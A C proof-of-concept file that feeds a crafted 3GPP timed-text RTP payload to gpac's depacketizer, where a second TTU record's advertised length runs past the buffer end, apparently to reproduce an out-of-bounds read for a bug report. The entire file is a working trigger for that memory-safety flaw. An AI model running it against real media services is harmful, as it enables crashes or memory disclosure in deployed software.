/*
 * PoC: crafted 3GPP timed-text RTP payload depacketized through gpac's
 * public RTP depacketizer API (gf_rtp_depacketizer_new/process).
 *
 * The payload carries two TTU records. The second record advertises a
 * ttu_len that fits within the total payload size but extends past the
 * end of the buffer relative to its own start offset.
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <gpac/setup.h>
#include <gpac/tools.h>
#include <gpac/list.h>
#include <gpac/ietf.h>

static void on_packet(void *udta, u8 *data, u32 size, GF_SLHeader *hdr, GF_Err e)
{
	u8 *buf = (u8 *)malloc(size);
	if (buf) {
		memcpy(buf, data, size);
		free(buf);
	}
	fprintf(stderr, "SL packet: %u bytes, err=%d\n", size, e);
	(void)udta; (void)hdr;
}

int main(int argc, char **argv)
{
	GF_SDPMedia media;
	GF_RTPMap map;
	GF_SDP_FMTP fmtp;
	GF_X_Attribute att;
	GF_RTPHeader hdr;
	GF_RTPDepacketizer *depk;
	u8 *payload;
	u32 size = 300;

	gf_sys_init(GF_MemTrackerNone, NULL);

	memset(&media, 0, sizeof(media));
	memset(&map, 0, sizeof(map));
	memset(&fmtp, 0, sizeof(fmtp));

	media.RTPMaps = gf_list_new();
	media.FMTP = gf_list_new();
	map.PayloadType = 96;
	map.payload_name = (char *)"3gpp-tt";
	map.ClockRate = 1000;
	gf_list_add(media.RTPMaps, &map);

	fmtp.PayloadType = 96;
	fmtp.Attributes = gf_list_new();
	att.Name = (char *)"tx3g";
	att.Value = (char *)"AAAA";
	gf_list_add(fmtp.Attributes, &att);
	gf_list_add(media.FMTP, &fmtp);

	depk = gf_rtp_depacketizer_new(&media, 0, on_packet, NULL);
	if (!depk) {
		fprintf(stderr, "failed to create depacketizer\n");
		return 1;
	}

	payload = (u8 *)malloc(size);
	memset(payload, 0x41, size);

	/* TTU #1 at offset 0: type 1, ttu_len 290 (consumes 291 bytes) */
	payload[0] = 0x01;
	payload[1] = 0x01;
	payload[2] = 0x22;

	/* TTU #2 at offset 291: type 1, ttu_len 299 -> 300 bytes advertised from offset 291 */
	payload[291] = 0x01;
	payload[292] = 0x01;
	payload[293] = 0x2B;

	memset(&hdr, 0, sizeof(hdr));
	hdr.Version = 2;
	hdr.PayloadType = 96;
	hdr.TimeStamp = 0;

	gf_rtp_depacketizer_process(depk, &hdr, payload, size);

	gf_rtp_depacketizer_del(depk);
	free(payload);
	gf_sys_close();
	return 0;
}
